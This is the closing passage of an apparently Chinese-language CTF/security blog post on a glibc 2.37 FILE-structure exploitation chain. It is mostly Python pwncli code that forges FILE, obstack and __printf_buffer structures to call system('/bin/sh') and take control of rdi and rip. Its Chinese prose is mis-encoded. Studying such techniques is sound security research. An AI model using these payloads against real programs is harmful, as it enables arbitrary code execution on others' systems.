<h3 id="obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨"><a href="#obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨" class="headerlink" title="obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨"></a>obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_read_base = <span class="number">0x68732f6e69622f</span>             <span class="comment">#0x18</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = leak_heap+<span class="number">0x18</span>               <span class="comment">#0x48</span></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>:leak_heap, <span class="comment">#fake a obstack</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="printf-bufferç»“æ„ã€obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨"><a href="#printf-bufferç»“æ„ã€obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨" class="headerlink" title="__printf_bufferç»“æ„ã€obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨"></a>__printf_bufferç»“æ„ã€obstackç»“æ„ä½“ä¸FILEç»“æ„ä½“å†…å­˜å¤ç”¨</h3><p>è¿™ä¸ª<code>payload</code>éœ€è¦çš„å†…å­˜æ˜¯æœ€å°çš„ï¼Œåªéœ€è¦<code>0xe0</code>å­—èŠ‚å¤§å°çš„å†…å­˜ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = fake_printf_buffer+ <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = fake_fp + <span class="number">0xa0</span>             <span class="comment">#0x48</span></span><br><span class="line">fp._wide_data = <span class="number">0x68732f6e69622f</span>                <span class="comment">#0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a __printf_buffer</span></span><br><span class="line">fp = payload_replace(<span class="built_in">bytes</span>(fp),&#123;</span><br><span class="line">    <span class="number">0x58</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>:fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="number">11</span>,</span><br><span class="line">    <span class="number">0x80</span>:fake_fp</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:fake_printf_buffer,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¯¥åˆ©ç”¨é“¾çœ‹èµ·æ¥éœ€è¦ç»•è¿‡çš„æ¡ä»¶å¾ˆå¤šï¼Œä½†æ˜¯å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¯ä»¥ç¨³å®šæ§åˆ¶<code>rdi</code>ä¸<code>rip</code>ã€‚ä½†æ˜¯<code>ubuntu</code>è¿˜æ²¡æœ‰ä½¿ç”¨<code>glibc2.37</code>ï¼Œæ‰€ä»¥ç›®å‰è¿™æ¡é“¾æ–°çš„è¿˜æ²¡æœ‰åˆ©ç”¨åœºæ™¯<code>2333</code>ã€‚ä½†æˆ‘ç›¸ä¿¡ä»¥åè¯´ä¸å®šä¼šæœ‰å®ƒçš„åˆ©ç”¨åœºæ™¯ã€‚</p>
<h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct __printf_buffer</span><br><span class="line">&#123;</span><br><span class="line">  char *write_base; 	0x0-0x8</span><br><span class="line">  char *write_ptr;		0x8-0x10</span><br><span class="line">  char *write_end;		0x10-0x18</span><br><span class="line">  uint64_t written;		0x18-0x20</span><br><span class="line">  enum __printf_buffer_mode mode; 0x20-0x24</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span>	<span class="number">0x0</span><span class="number">-0x24</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span>		<span class="number">0x28</span><span class="number">-0x30</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;	<span class="number">0x30</span><span class="number">-0x31</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</section>
    
    <p class="post-date" dir="">April 9, 2023</p>

    
      <div class="tags"    dir="">
        
  <a href="/tags#IO_attack" >
    <span class="tag-code">IO_attack</span>
  </a>

  <a href="/tags#glibc" >
    <span class="tag-code">glibc</span>
  </a>

      </div>
    


    
      <section id="comments">
        
      <script>
        var disqus_shortname = '7resp4ss';
        
        var disqus_url = 'https://7resp4ss.github.io/2023/04/09/house-of-snake/';
        
        (function(){
          var dsq = document.createElement('script');
          dsq.type = 'text/javascript';
          dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>
    
        <div id="disqus_thread">
          <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
        </div>
      </section>
    
  </article>
</main>

<script>
  (function () {
    var url = 'https://7resp4ss.github.io/2023/04/09/house-of-snake/';
    $('#article-banner').geopattern(url)
    $('.header').removeClass('fixed-header')

     // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', 'http://file.muyutech.com/error-img.png') 
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      var imageW = $(this).width()
      var imageH = $(this).height()
      
      var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
      zoom = zoom < 1 ? 1 : zoom
      zoom = zoom > 2 ? 2 : zoom
      var transY = (($(window).height() - imageH) / 2).toFixed(2)

      $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
      $('.image-view-wrap').addClass('wrap-active')
      $('.image-view-wrap img').css({
        'width': `${imageW}`,
        'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
      })
      $('html').css('overflow', 'hidden')

      $('.image-view-wrap').on('click', function() {
        $(this).remove()
        $('html').attr('style', '')
      })
    })

  })();
</script>

    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
  <p class="copyright">
    &copy; 2023 | Ù…Ø¨Ù†ÙŠ Ø¹Ù„Ù‰
           <a href="https://hexo.io" target="_blank">Ù‡ÙŠÙƒØ³Ùˆ</a>
    <br>
    <a target="_blank" rel="noopener" href="https://github.com/bluemix/hexo-theme-rexo">Rexo</a>
  </p>
</footer>

<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  FastClick.attach(document.body);
</script>

<script>
  var hasLine = 'true';
  $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine == 'false') {
        figure.find('.gutter').hide();
      }
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
</script>
<!-- Baidu Tongji -->


<script src="/js/script.js"></script>

  </body>
</html>